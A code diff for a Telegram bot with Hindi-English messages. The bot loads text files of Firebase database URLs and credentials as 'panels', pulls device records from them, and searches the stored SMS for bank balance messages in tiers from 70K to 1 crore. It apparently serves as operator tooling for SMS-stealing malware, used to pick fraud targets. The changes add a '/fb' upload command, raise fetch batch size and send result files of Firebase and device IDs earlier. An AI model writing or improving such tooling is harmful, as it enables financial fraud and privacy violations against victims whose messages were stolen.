@@ -39,12 +39,12 @@ const bot = new Telegraf(TOKEN);
 
 bot.start(ctx => {
   ctx.reply(
-    '*Panel search virtus* (dev)\n\n' +
-      '📂 File + caption `addtxt` — bulk Firebase\n' +
-      '🔎 `/search` — menu\n' +
+    '✅ Already authorized!\n\n' +
+      '📩 .txt file bhejo (caption: `addtxt` ya `/fb`)\n' +
+      '🔎 `/search` — commands\n' +
       '⚡ `/search avl/bal, bank online`\n' +
-      '🏦 `/searchbank` — 70K–1Cr tier\n' +
-      '/status · /fetch · /done',
+      '🏦 `/searchbank` — 70K–1Cr\n' +
+      '/status · /done',
     { parse_mode: 'Markdown' }
   );
 });
@@ -79,8 +79,11 @@ bot.command('add', async ctx => {
 
 bot.on('document', async ctx => {
   const cap = (ctx.message.caption || '').toLowerCase();
-  if (!cap.includes('addtxt')) {
-    return ctx.reply('File bhejne par caption mein likho: *addtxt*', { parse_mode: 'Markdown' });
+  if (!cap.includes('addtxt') && !cap.includes('/fb') && cap !== 'fb') {
+    return ctx.reply(
+      '📩 Send me a .txt with your firebases!\nCaption: `addtxt` ya `/fb`\n\nFormat: URL + auth (mixed text OK)',
+      { parse_mode: 'Markdown' }
+    );
   }
   try {
     const link = await ctx.telegram.getFileLink(ctx.message.document.file_id);
@@ -138,16 +141,18 @@ async function executeSearch(ctx, commandText) {
     const onlineLbl = opts.bothStatus ? '🔄 Both' : opts.online ? '🟢 Online' : '⚫ Offline';
     const sortLbl = out.tier.label.includes('LOW') ? '💰 Low->High' : '💰 High->Low';
 
+    const fname = `sms_avlbal_bank_${Date.now()}.txt`;
+    await ctx.replyWithDocument(Input.fromBuffer(Buffer.from(out.text, 'utf8'), fname));
+
     await ctx.telegram.editMessageText(
       ctx.chat.id,
       status.message_id,
       undefined,
       `✅ Done! avl/bal, bank | ${onlineLbl} | ${pinLbl} | ${sortLbl} | Last ${opts.days} days.\n` +
-        `Matches: ${out.stats.sms} · Devices: ${out.stats.devices} · ${(out.elapsed / 1000).toFixed(0)}s`
+        `📊 ${out.stats.sms} matches in ${(out.elapsed / 1000).toFixed(0)}s\n` +
+        '📄 File sent above ☝️\n' +
+        `Firebase+Device ID TXT · DBs: ${out.stats.panelsHit}/${globalPanels.length}`
     );
-
-    const fname = `sms_avlbal_bank_${Date.now()}.txt`;
-    await ctx.replyWithDocument(Input.fromBuffer(Buffer.from(out.text, 'utf8'), fname));
 
     USER_PANELS.set(uid, { devices: out.results, at: Date.now(), search: opts });
   } catch (e) {
@@ -176,9 +181,17 @@ bot.command('searchbank', async ctx => {
   await executeSearch(ctx, text);
 });
 
+bot.command('fb', ctx => {
+  ctx.reply(
+    '📩 Mujhe .txt bhejo caption `fb` ya `addtxt` ke saath.\n' +
+      `Abhi loaded panels: *${globalPanels.length}*`,
+    { parse_mode: 'Markdown' }
+  );
+});
+
 bot.command('done', ctx => {
   SEARCH_ABORT.delete(ctx.from.id);
-  ctx.reply('OK — search flag clear. Naya /search bhejo.');
+  ctx.reply(`✅ Total panels: ${globalPanels.length}\nAb /search chalao.`);
 });
 
 bot.command('fetch', async ctx => {
@@ -187,7 +200,7 @@ bot.command('fetch', async ctx => {
   const status = await ctx.reply(`⚡ Fetch ${globalPanels.length} panels...`);
   try {
     const devices = await fetchAllPanels(globalPanels, {
-      batch: 15,
+      batch: 35,
       onProgress(done, total, count) {
         if (done % 25 === 0 || done === total) {
           ctx.telegram
